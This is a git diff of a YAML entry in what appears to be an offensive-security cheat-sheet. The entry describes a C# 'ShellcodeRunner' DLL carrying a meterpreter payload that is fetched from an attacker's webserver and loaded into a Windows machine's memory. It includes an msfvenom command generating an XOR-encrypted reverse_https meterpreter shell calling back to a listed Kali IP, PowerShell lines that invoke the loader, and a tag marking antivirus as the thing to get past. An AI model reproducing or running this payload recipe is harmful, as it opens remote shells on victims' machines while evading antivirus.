@@ -1,10 +1,12 @@
 ---
 description: |
-  Shellrunner in managed DLL, with the below code you can create a DLL that hold an meterpreter shell. Host this DLL on your webserver and retrieve it via the second part of the code, which makes sure the DLL is directly loaded into the memory of the Windows machine.
+  Shellrunner in managed DLL, with the below code you can create a DLL that hold an meterpreter payload. Host this DLL on your webserver and retrieve it via the second part of the code, which makes sure the DLL is directly loaded into the memory of the Windows machine. Important to note is the naming of the namespace 'ShellcodeRunner' and the method that must be executed 'Run'. Those are mentioned in the commands.
 
   Command Reference:
 
-  	byte[] buf: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.13.37 LPORT=443 EXITFUNC=thread -f csharp --encrypt xor --encrypt-key a
+  	Kali machine: 10.10.14.21
+
+  	byte[] buf: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.21 LPORT=443 EXITFUNC=thread -f csharp --encrypt xor --encrypt-key a
 
 
 command: |
@@ -19,7 +21,7 @@ command: |
     $method.Invoke(0, $null)
     Or
     $a = [ShellcodeRunner.Program]::Run()
-    ```
+    
 
 code: |
     using System;
@@ -89,7 +91,7 @@ code: |
 items:
     - Shell
 services:
-    - 
+    - Antivirus
 OS:
     - Windows
 attack_types:
